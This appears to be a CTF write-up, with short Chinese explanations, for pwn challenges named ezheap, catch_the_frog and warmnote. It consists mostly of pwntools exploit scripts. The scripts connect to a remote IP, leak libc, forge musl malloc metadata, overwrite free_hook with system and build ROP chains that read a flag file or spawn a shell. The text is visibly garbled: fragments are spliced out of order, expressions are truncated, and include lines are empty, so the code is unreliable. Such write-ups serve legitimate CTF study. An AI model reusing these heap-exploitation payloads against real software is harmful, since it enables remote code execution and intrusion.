edit(8,'/bin/sh\x00')
move(9,8)
p.interactive()
from pwn import *
def add(idx,size,buf):
    s.sendlineafter(b">>",b"1")
    s.sendlineafter(b"idx?",str(idx).encode())
    s.sendlineafter(b"size?",str(size).encode())
    s.sendafter(b"Contnet?",buf)
def free(idx):
    s.sendlineafter(b">>",b"2")
    s.sendlineafter(b"idx?",str(idx).encode())
def show(idx):
    s.sendlineafter(b">>",b"3")
    s.sendlineafter(b"idx?",str(idx).encode())
# s = process("./r")
s = remote("123.60.25.24","12345")
add(0,3,b"A\n")
# add(1,5,b"BBBB")
for i in range(1,14):
    add(i,3,str(i)+"\n")
free(0)
add(14,3,b'1\n')
add(0,0,b'A'*14+p16(0x202)+b"\n")
show(0)
libc = ELF("./libc.so")
libc.address = u64(s.recvuntil("\x7f")[-6:]+b"\x00\x00")-0x298d0a
success(hex(libc.address))
secret_addr = libc.sym['__malloc_context']
free(2)
add(0,0,b'A'*0x10+p64(secret_addr)+p32(0x1000)+b"\n")
show(3)
s.recvuntil(b"Content: ")
secret = u64(s.recv(8))
success(hex(secret))
# add(3,0,b'tttt')
free(4)
free(5)
add(15,0xa9c,'a\n')
fake_meta_addr = libc.address+0x293010
fake_mem_addr = libc.address+0x298df0
fake_mem = p64(fake_meta_addr)+p64(1)
sc = 10 # 0xbc
freeable = 1
last_idx = 1
maplen = 2
fake_meta = p64(libc.sym['__stdin_FILE']-0x18)#next
fake_meta += p64(fake_mem_addr)#priv
fake_meta += p64(fake_mem_addr)
fake_meta += p64(2)
fake_meta += p64((maplen >",b"1")
s.sendlineafter(b"idx?",str(0).encode())
s.sendlineafter(b"size?",str(0xb0).encode())
ret = libc.address+0x0000000000000598
pop_rdi = libc.address+0x0000000000014b82
pop_rsi = libc.address+0x000000000001b27a
pop_rdx = libc.address+0x0000000000009328
mov_rsp = libc.address+0x000000000004a5ae
payload = 
p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(libc.sym['__stdout_FILE']-64)+p64(pop_rdx)+p64(0x3
00)
payload += p64(libc.sym['read'])
payload = payload.ljust(64,b'\x00')
payload += 
b'A'*32+p64(1)+p64(1)+p64(libc.sym['__stdout_FILE']-64)+p64(ret)+p64(3)+p64(mov_rsp)+b"
\n"
s.send(payload)
payload = b'/home/ctf/flag/flag\x00'
payload = payload.ljust(24,b'\x00')
payload += 
p64(pop_rdi)+p64(libc.sym['__stdout_FILE']-64)+p64(pop_rsi)+p64(0)+p64(libc.sym['open']
)
payload += 
p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(libc.sym['__stdout_FILE']+0x100)+p64(pop_rdx)+p64(
0x50)+p64(libc.sym['read'])
payload += 
p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(libc.sym['__stdout_FILE']+0x100)+p64(pop_rdx)+p64(
0x500)+p64(libc.sym['write'])
s.send(payload)
s.interactive()
ezheap
功能⾥的index都能越界
可以通过got偏移，获得libc的bss段读取写⼊权限，然后打stdout的虚表微偏移，打到附近的⼀个虚表，调⽤puts
时会调⽤free(stdout+固定偏移)，在固定偏移附近布局 ;sh\\x00 ，再改写free hook。
from pwn import *
context.log_level="debug"
p=remote('123.60.25.24',20077)#process("./ezheap")
libc=ELF("./libc.so.6")
sla=lambda y,x:p.sendlineafter(y,x)
def leakoff(off):
    #base 0xf7fcc5c0 free_hook:0xf7fcd8d0 stdout:0xf7fccd80
    sla("choice>>","3")
    sla("type ","3")
    sla("idx>>","-2071")
    sla("_idx",str(off))
    p.recvuntil("value>>\n")
    return int(p.recvline())
def editoff(off,val):
    sla("choice>>","2")
    sla("type ","3")
    sla("idx>>","-2071")
    sla("_idx",str(off))
    p.recvuntil("value>>")
    p.sendline(str(val))
fvtbl=leakoff(496+148//4)
libc_base=fvtbl-libc.sym['_IO_file_jumps']
print(hex(libc_base))
bin_sh=next(libc.search(b"/bin/sh\x00"))+libc_base
system=libc_base+libc.sym['system']
#gdb.attach(p,"b free\nc\n")
editoff(496,0)
editoff((0xf7fcd8d0-0xf7fcc5c0)//4,system)
editoff(496,0)
editoff(496,0)
fvtbl+=0xE0-0x80-8
editoff(496+72//4+1,u32(b';sh\x00'))
editoff(496+148//4,fvtbl)
p.interactive()
catch_the_frog
输⼊是 Native Object Protocols 协议
编译了⼀份 libnop 的 binary, 对着有符号版本的逆了⼀下发现 object 的格式是
std::int32_t age_years; std::uint64_t height_inches; std::uint64_t weight_pounds; std::string name;
这样⼦的结构体
参照 libnop ⽂档写了个交互c++程序
⽤下⾯的binary和python脚本和题⽬进⾏交互，剩下的是⼀个 2.27 的libc堆溢出菜单题
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
namespace example {
struct Person {
  std::int32_t age_years;
  std::uint64_t height_inches;
  std::uint64_t weight_pounds;
  std::string name;
  NOP_STRUCTURE(Person, age_years, height_inches, weight_pounds, name);
};
}  // namespace example
int main(int argc, char** argv) {
  using Writer = nop::StreamWriter;
  nop::Serializer serializer;
  int32_t opcode;
  uint64_t index;
  uint64_t size;
  std::string input;
  std::cout > opcode;
  std::cout > index;
  std::cout > size;
  std::cout > input;
  serializer.Write(example::Person{opcode, index, size, input});
  const std::string data = serializer.writer().stream().str();
  std::cout >32,1)
edit0(),edit1(0xCAFEBABE,1) #exit
alloc(9,2)
enter_edit(9)
edit0(),edit1(system&0xffffffff,1)
warmnote
edit处有off by one null
calloc还要诡异的伪造⼀下meta
edit0(),edit1(system>>32,1)
enter_edit(3)
edit0(),edit1(26739,1)
p.interactive()
from pwn import *
def add(size,title,note):
    s.sendlineafter(b">>",b"1")